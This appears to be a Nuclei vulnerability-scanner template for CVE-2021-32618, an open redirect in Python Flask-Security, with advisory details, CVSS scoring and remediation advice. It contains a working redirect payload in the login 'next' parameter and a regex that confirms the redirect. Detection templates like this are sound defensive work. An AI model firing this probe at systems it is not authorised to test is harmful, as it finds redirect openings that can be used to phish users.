id: CVE-2021-32618

info:
  name: Python Flask-Security - Open Redirect
  author: 0x_Akoko
  severity: medium
  description: Python Flask-Security contains an open redirect vulnerability. Existing code validates that the URL specified in the next parameter is either relative or has the same network location as the requesting URL. Certain browsers accept and fill in the blanks of possibly incomplete or malformed URLs. An attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.
  remediation: |
    Upgrade to the latest version of Python Flask-Security library to fix the open redirect vulnerability.
  reference:
    - https://github.com/Flask-Middleware/flask-security/security/advisories/GHSA-6qmf-fj6m-686c
    - https://github.com/Flask-Middleware/flask-security/issues/486
    - https://nvd.nist.gov/vuln/detail/CVE-2021-32618
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2021-32618
    cwe-id: CWE-601
    epss-score: 0.00104
    epss-percentile: 0.42118
    cpe: cpe:2.3:a:flask-security_project:flask-security:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: flask-security_project
    product: flask-security
  tags: cve,cve2021,redirect,flask,flask-security_project

http:
  - method: GET
    path:
      - '{{BaseURL}}/login?next=\\\interact.sh'

    matchers:
      - type: regex
        part: header
        regex:
          - '(?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)(?:[a-zA-Z0-9\-_\.@]*)interact\.sh\/?(\/|[^.].*)?$' # https://regex101.com/r/L403F0/1
# digest: 4a0a004730450220413311d1c9911c1f63b30c9350917abe3f95d2d6208691102a62ed73247bc2bd022100cb82c4a23213e88f5abc237c9c0dae52c07cd559cd13d79f9c24a99a6aed8856:922c64590222798bb761d5b6d8e72950